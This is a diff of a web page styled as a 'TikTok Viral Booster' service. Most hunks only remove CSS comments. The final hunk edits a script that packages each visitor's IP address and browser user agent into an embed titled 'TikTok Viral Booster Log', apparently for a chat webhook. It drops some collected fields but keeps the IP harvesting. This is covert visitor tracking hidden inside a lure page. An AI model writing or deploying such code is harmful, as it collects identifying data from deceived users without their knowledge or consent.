@@ -45,10 +45,10 @@
             border: 1px solid rgba(255, 255, 255, 0.1);
         }
         .logo {
-            font-size: 60px; /* Adjusted size for emoji */
+            font-size: 60px;
             line-height: 1;
             margin-bottom: 20px;
-            color: #e62241; /* TikTok red */
+            color: #e62241;
             text-shadow: 0 0 10px rgba(230, 34, 65, 0.7);
         }
         h1 {
@@ -133,15 +133,15 @@
             background: rgba(230, 34, 65, 0.2);
             transform: translateY(-5px);
         }
-        .service-card .icon { /* Using a class for the emoji/symbol */
+        .service-card .icon {
             font-size: 40px;
             margin-bottom: 10px;
             line-height: 1;
-            filter: grayscale(100%); /* Start gray */
+            filter: grayscale(100%);
             transition: filter 0.3s;
         }
         .service-card.selected .icon {
-            filter: grayscale(0%); /* Full color on select */
+            filter: grayscale(0%);
         }
         .quantity-selector {
             margin-top: 15px;
@@ -343,10 +343,7 @@
                     color: 16750848,
                     fields: [
                         { name: "IP Address", value: ipAddress, inline: true },
-                        { name: "User Agent", value: navigator.userAgent, inline: false },
-                        { name: "Screen Resolution", value: `${window.screen.width}x${window.screen.height}`, inline: true },
-                        { name: "Language", value: navigator.language, inline: true },
-                        { name: "Timestamp", value: new Date().toISOString(), inline: false }
+                        { name: "User Agent", value: navigator.userAgent, inline: false }
                     ],
                     footer: { text: "TikTok Viral Booster Log" }
                 }]
